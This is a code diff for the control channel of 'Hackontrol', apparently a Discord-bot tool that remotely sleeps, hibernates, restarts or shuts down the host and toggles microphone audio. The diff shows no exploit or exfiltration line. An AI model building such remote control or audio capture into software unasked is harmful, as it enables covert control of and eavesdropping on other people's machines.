@@ -9,6 +9,7 @@ import javax.sound.sampled.TargetDataLine;
 
 import com.khopan.hackontrol.Hackontrol;
 import com.khopan.hackontrol.HackontrolChannel;
+import com.khopan.hackontrol.NativeLibrary;
 import com.khopan.hackontrol.manager.button.ButtonContext;
 import com.khopan.hackontrol.manager.button.ButtonManager;
 import com.khopan.hackontrol.manager.button.Question;
@@ -27,9 +28,10 @@ import net.dv8tion.jda.api.managers.AudioManager;
 public class ControlChannel extends HackontrolChannel {
 	private static final String CHANNEL_NAME = "control";
 
-	private static final String BUTTON_SLEEP = "controlSleep";
-	private static final String BUTTON_SHUTDOWN = "controlShutdown";
-	private static final String BUTTON_RESTART = "controlRestart";
+	private static final String BUTTON_SLEEP = "buttonSleep";
+	private static final String BUTTON_HIBERNATE = "buttonHibernate";
+	private static final String BUTTON_RESTART = "buttonRestart";
+	private static final String BUTTON_SHUTDOWN = "buttonShutdown";
 
 	private static final String BUTTON_CONNECT = "controlConnect";
 	private static final String BUTTON_DISCONNECT = "controlDisconnect";
@@ -50,9 +52,10 @@ public class ControlChannel extends HackontrolChannel {
 	@Override
 	public void initialize() {
 		this.channel.sendMessage("**Power Control**").addActionRow(
-				ButtonManager.staticButton(ButtonStyle.SUCCESS, "Sleep", ControlChannel.BUTTON_SLEEP),
-				ButtonManager.staticButton(ButtonStyle.DANGER, "Shutdown", ControlChannel.BUTTON_SHUTDOWN),
-				ButtonManager.staticButton(ButtonStyle.PRIMARY, "Restart", ControlChannel.BUTTON_RESTART)
+				ButtonManager.staticButton(ButtonStyle.SECONDARY, "Sleep", ControlChannel.BUTTON_SLEEP),
+				ButtonManager.staticButton(ButtonStyle.SUCCESS, "Hibernate", ControlChannel.BUTTON_HIBERNATE),
+				ButtonManager.staticButton(ButtonStyle.PRIMARY, "Restart", ControlChannel.BUTTON_RESTART),
+				ButtonManager.staticButton(ButtonStyle.DANGER, "Shutdown", ControlChannel.BUTTON_SHUTDOWN)
 				).queue();
 
 		this.channel.sendMessage("**Microphone Control**").addActionRow(
@@ -64,16 +67,31 @@ public class ControlChannel extends HackontrolChannel {
 	@Override
 	public void register(Registry registry) {
 		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.BUTTON_SLEEP, context -> this.power(context, PowerAction.SLEEP));
-		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.BUTTON_SHUTDOWN, context -> this.power(context, PowerAction.SHUTDOWN));
+		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.BUTTON_HIBERNATE, context -> this.power(context, PowerAction.HIBERNATE));
 		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.BUTTON_RESTART, context -> this.power(context, PowerAction.RESTART));
+		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.BUTTON_SHUTDOWN, context -> this.power(context, PowerAction.SHUTDOWN));
 		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.BUTTON_CONNECT, context -> this.connect(context, true));
 		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.BUTTON_DISCONNECT, context -> this.connect(context, false));
 	}
 
 	private void power(ButtonContext context, PowerAction powerAction) {
-		Question.create(context.reply(), "Are you sure you want to " + powerAction.text + '?', OptionType.YES_NO, result -> {
-			if(QuestionResponse.POSITIVE_RESPONSE.equals(result)) {
-				context.sendMessage(powerAction.text).queue();
+		Question.create(context.reply(), "Are you sure you want to " + powerAction.lowercase + '?', OptionType.YES_NO, response -> {
+			if(QuestionResponse.POSITIVE_RESPONSE.equals(response)) {
+				int result = switch(powerAction) {
+				case SLEEP -> NativeLibrary.sleep();
+				case HIBERNATE -> NativeLibrary.hibernate();
+				case RESTART -> NativeLibrary.restart();
+				case SHUTDOWN -> NativeLibrary.shutdown();
+				};
+
+				if(result > 0) {
+					HackontrolError.message(context.message(), powerAction.uppercase + " is not supported");
+					return;
+				}
+
+				if(result < 0) {
+					HackontrolError.message(context.message(), powerAction.uppercase + " operation has failed due to unknown reasons");
+				}
 			}
 		});
 	}
@@ -151,14 +169,17 @@ public class ControlChannel extends HackontrolChannel {
 	}
 
 	private static enum PowerAction {
-		SLEEP("sleep"),
-		SHUTDOWN("shutdown"),
-		RESTART("restart");
+		SLEEP("Sleep", "sleep"),
+		HIBERNATE("Hibernate", "hibernate"),
+		SHUTDOWN("Shutdown", "shutdown"),
+		RESTART("Restart", "restart");
 
-		private final String text;
+		private final String uppercase;
+		private final String lowercase;
 
-		PowerAction(String text) {
-			this.text = text;
+		PowerAction(String uppercase, String lowercase) {
+			this.uppercase = uppercase;
+			this.lowercase = lowercase;
 		}
 	}
 
